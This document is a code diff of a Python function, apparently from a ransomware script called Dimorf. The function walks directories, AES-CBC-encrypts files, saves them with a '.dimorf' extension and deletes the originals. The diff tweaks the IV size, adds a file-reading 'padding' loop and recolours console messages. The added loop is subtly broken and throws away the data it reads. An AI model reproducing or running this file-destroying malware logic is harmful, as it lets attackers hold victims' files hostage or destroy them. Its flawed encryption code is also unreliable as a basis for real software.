@@ -90,7 +90,7 @@ def find_and_encrypt(
                 ):
                     
                     # # beginning encrypt operations.
-                    init_vector = Random.new().read(32)
+                    init_vector = Random.new().read(16)
                     cipher = AES.new(
                         key,
                         AES.MODE_CBC,
@@ -99,9 +99,23 @@ def find_and_encrypt(
                     
                     # # open and reads file in blocks of 65536 bytes.    
                     with open(os.path.join(root, file), mode='rb') as f:
-                        data = f.read(
-                            block_bytes
-                        )
+                        while True:
+                            data = f.read(
+                                block_bytes
+                            )
+
+                            # # add padding
+                            if len(data) == 0:
+                                data += b'\x00\x01' * (
+                                    16 - (
+                                        len(
+                                            data
+                                        ) % 16
+                                    )
+                                )
+                                break
+                            else:
+                                pass
 
                     # # creates a new one with the same encrypted information
                     # # and adds the modified extension ".dimorf".
@@ -116,7 +130,7 @@ def find_and_encrypt(
                             )
                         ):
                             # # show.
-                            print(f'\33[31mArquivo {os.path.join(root, file)} Encriptado.\33[0m')
+                            print(f'\33[34mArquivo {os.path.join(root, file)} Encriptado.\33[0m')
                     
                     # # remove the original file.
                     os.remove(
@@ -138,10 +152,24 @@ def find_and_encrypt(
                         
                         # # open and reads file in blocks of 65536 bytes.    
                         with open(os.path.join(root, file), mode='rb') as f:
-                            data = f.read(
-                                block_bytes
-                            )
+                            while True:
+                                data = f.read(
+                                    block_bytes
+                                )
 
+                                # # add padding
+                                if len(data) == 0:
+                                    data += b'\x00\x01' * (
+                                        16 - (
+                                            len(
+                                                data
+                                            ) % 16
+                                        )
+                                    )
+                                    break
+                                else:
+                                    pass
+                            
                         # # creates a new one with the same encrypted information
                         # # and adds the modified extension ".dimorf".
                         with open(f'{os.path.join(root, file)}{new_ext}', mode='wb') as f:
@@ -156,7 +184,7 @@ def find_and_encrypt(
                             ):
                                 
                                 # # show.
-                                print(f'\33[31mArquivo {os.path.join(root, file)} Encriptado.\33[0m')
+                                print(f'\33[34mArquivo {os.path.join(root, file)} Encriptado.\33[0m')
                     
                         # # remove the original file.
                         os.remove(
@@ -196,7 +224,7 @@ def find_and_encrypt(
                                     print(
                                         f'\33[32mLogs gerado em {lf}\33[0m'
                                     )
-                            
+                                    
                             
 if __name__ == '__main__':
     check_os('posix')
